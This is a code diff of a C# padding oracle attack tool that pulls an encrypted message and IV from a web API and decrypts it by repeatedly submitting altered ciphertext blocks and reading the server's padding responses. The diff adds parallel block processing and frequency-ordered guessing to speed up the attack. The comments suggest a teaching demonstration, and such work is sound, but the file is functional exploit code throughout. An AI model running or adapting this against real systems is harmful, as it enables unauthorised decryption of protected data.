@@ -1,12 +1,10 @@
+#define COMPLEX
 using Newtonsoft.Json.Linq;
 using System;
-using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Net;
-using System.Net.Cache;
-using System.Security.Cryptography;
 using System.Text;
 using System.Threading.Tasks;
 
@@ -16,31 +14,27 @@ namespace PadOracle
     {
         static string host = $"http://{Properties.Settings.Default.hostName}/api/";
         static string path = "encrypted";
-        static string b64Cipher;
-        static string b64Vector;
         static byte[] byCipher;
         static byte[] byIV;
         static int blocksize = Properties.Settings.Default.blockSize;
-        static string urlIV;
-        static string urlCipher;
         static string reqFormat = $"{host}{path}/submit?ciphertext={{0}}&IV={{1}}";
         // Statistics
         static int totalTries = 0;
         static int mostTries = 0;
         static char worstChar = 'e';
-        static DateTime startTime = DateTime.Now;
+        static readonly DateTime startTime = DateTime.Now;
 
         // Special case trial code for padding. Padding must be one of these bytes,
         // so while we're looking at the last block, we don't need to scan all 256 chars.
         // By putting the 0x01 at the end, we avoid a special case in decrypting the last block.
-        static byte[] trial1 = new byte[]
+        static readonly byte[] trial1 = new byte[]
         {
                 0x02,0x03,0x04,0x05,0x06,0x07,0x08,
                 0x09,0x0a,0x0b,0x0c,0x0d,0x0e,0x0f,0x10,0x01
         };
 
         // Characters are in English frequency.
-        static byte[] trial2 = FrequencyTrial();
+        static readonly byte[] trial2 = FrequencyTrial();
         static byte[] FrequencyTrial()
         {
             // Regular trial code for the message body - use letter frequencies to reduce unsuccessful requests.
@@ -52,17 +46,17 @@ namespace PadOracle
             string charfreq = "etaonishrlducmwyfgpbvkjxqzETAONISHRLDUCMWYFGPBVKJXQZ,. -'_?:()!0123456789\n\r";
             byte[] trial = new byte[256];
             UTF8Encoding.UTF8.GetBytes(charfreq).CopyTo(trial, 0);
-            int jx = charfreq.Length;
+            int j = charfreq.Length;
             // Fill in the rest of the bytes, in case there's a character we didn't think of.
             for (int i = 0; i < 256; i++)
             {
                 if (!charfreq.Contains((char)i))
                 {
-                    trial[jx++] = (byte)i;
+                    trial[j++] = (byte)i;
                 }
             }
             // We got all the bytes exactly once, yes?
-            Debug.Assert(jx == 256);
+            Debug.Assert(j == 256);
             return trial;
         }
 
@@ -80,7 +74,12 @@ namespace PadOracle
 
             // I used to go from last block to first, to show handling the special case of existing padding 
             // But the message reads better if we go forward.
-            for (int nBlock = 0; nBlock < nBlocks; nBlock++)
+#if COMPLEX
+            ParallelOptions paropts = new ParallelOptions() { MaxDegreeOfParallelism = -1 };
+#else
+            ParallelOptions paropts = new ParallelOptions() { MaxDegreeOfParallelism = 1 };
+#endif
+            Parallel.For(0, nBlocks, paropts, (nBlock) =>
             {
                 thisPlainBlock = MutateBlock(nBlock, nBlock == nBlocks - 1);
 
@@ -96,6 +95,7 @@ namespace PadOracle
                 txtPlainBlock = UTF8Encoding.UTF8.GetString(thisPlainBlock, 0, nTake);
                 Console.WriteLine($"Plain block[{nBlock}/{nBlocks}]: {txtPlainBlock}");
             }
+            );
 
             // Output the whole thing plus statistics
             int clearLength = byCipher.Length;
@@ -108,7 +108,7 @@ namespace PadOracle
             Console.WriteLine($"\tTime spent: {seconds} - {totalTries / seconds} trials per second.");
             Console.WriteLine($"\tTotal Tries: {totalTries} - Average tries per character: {(double)totalTries / byCipher.Length}");
             Console.WriteLine($"\tMost tries: {mostTries} - worst char '{worstChar}'");
-        }
+       }
 
         static byte[] MutateBlock(int nBlock, bool isLastBlock)
         {
@@ -118,18 +118,34 @@ namespace PadOracle
             byte[] plainText = new byte[blocksize];
             int padCount;
             int tries = 0;
-            byte[] trialValues = trial2; // Frequency trial.
+            byte[] trialValues = Enumerable.Range(0, 256).Select(x=>(byte)x).ToArray(); // {0..256}
+#if COMPLEX
+            trialValues = trial2; // Frequency trial.
             if (isLastBlock)
                 trialValues = trial1; // Padding end bytes.
+#endif
 
             // Working backwards through the block.
             for (int j = blocksize - 1; j >= 0; j--)
             {
                 padCount = blocksize - j;
 
-                // Optimise by choosing the right trial frequency set - we could just iterate 0-255.
-                if (isLastBlock && padCount > 1 && padCount > plainText[blocksize - 1])
-                    trialValues = trial2; // Frequency trial.
+#if COMPLEX
+                if (isLastBlock && padCount > 1)
+                {
+                    // We're in the last block, and we've figured out what padding we need.
+                    if (padCount <= plainText[blocksize - 1])
+                    {
+                        // Optimise the padding in the last block - it'll always be plainText[blocksize-1]
+                        trialValues[0] = plainText[blocksize - 1]; // Only value worth trying.
+                    }
+                    else
+                    {
+                        // Optimise by choosing the right trial frequency set - we could just iterate 0-255.
+                        trialValues = trial2; // Frequency trial.
+                    }
+                }
+#endif
 
                 // Set the end of the mutated block to the padding count we're currently trying.
                 for (int k = blocksize - 1; k > j; k--)
@@ -141,9 +157,15 @@ namespace PadOracle
 
                 byte byTarget = mutatedBlock[j];
                 // Working forwards through the trial set.
+#if COMPLEX
+
                 foreach (byte trialValue in trialValues)
                 {
                     int i = byTarget ^ trialValue ^ padCount;
+#else
+                for (int i = 0; i < 256; i++)
+                {
+#endif
                     mutatedBlock[j] = (byte)i;
 
                     // Statistics
@@ -161,7 +183,7 @@ namespace PadOracle
                         ch = Encoding.UTF8.GetString(new byte[] { plainText[j] });
                         if (ch[0] < ' ' || ch[0] > 127)
                             ch = "?";
-                        Console.WriteLine($"Plaintext[{j,2}]: {plainText[j],3} {ch} ({tries,3} tries) - C[N-1]={testBlock[j],3}, C[N]={testBlock[j + blocksize],3}, C'[N-1]={i,3}, I[N]={intermediate[j],3}");
+                        Console.WriteLine($"Plaintext[{nBlock,3}.{j,2}]: {plainText[j],3} {ch} ({tries,3} tries) - C[N-1]={testBlock[j],3}, C[N]={testBlock[j + blocksize],3}, C'[N-1]={i,3}, I[N]={intermediate[j],3}");
 
                         // Statistics
                         if (tries > mostTries)
@@ -171,6 +193,10 @@ namespace PadOracle
                         }
 
                         // Stop on success.
+#if !COMPLEX
+                        // But don't stop if we found a padding of 1 at the last byte of the last block.
+                        if (isLastBlock && j == blocksize - 1 && plainText[j] == 1) continue;
+#endif
                         break;
                     }
                 }
@@ -198,21 +224,18 @@ namespace PadOracle
                 respText = new StreamReader(wr.GetResponseStream()).ReadToEnd();
             }
             JObject job = JObject.Parse(respText);
-            b64Cipher = (string)job["ciphertext"];
-            b64Vector = (string)job["iv"];
+            string b64Cipher = (string)job["ciphertext"];
+            string b64Vector = (string)job["iv"];
             // Decode from base64 to bytes
             byCipher = Convert.FromBase64String(b64Cipher);
             byIV = Convert.FromBase64String(b64Vector);
-            urlIV = WebUtility.UrlEncode(b64Vector);
-            urlCipher = WebUtility.UrlEncode(b64Cipher);
         }
 
         static bool CheckCode(byte[] byCheck, int offset, int len)
         {
             int retryCount = 5;
             string urlCheck = WebUtility.UrlEncode(Convert.ToBase64String(byCheck, offset, len));
-            bool isOriginal = urlCheck.Equals(urlCipher);
-            urlIV = WebUtility.UrlEncode(Convert.ToBase64String(byIV, 0, blocksize));
+            string urlIV = WebUtility.UrlEncode(Convert.ToBase64String(byIV, 0, blocksize));
             if (offset >= blocksize)
                 urlIV = WebUtility.UrlEncode(Convert.ToBase64String(byCheck, offset, blocksize));
             var wc = WebRequest.CreateHttp(string.Format(reqFormat, urlCheck, urlIV));
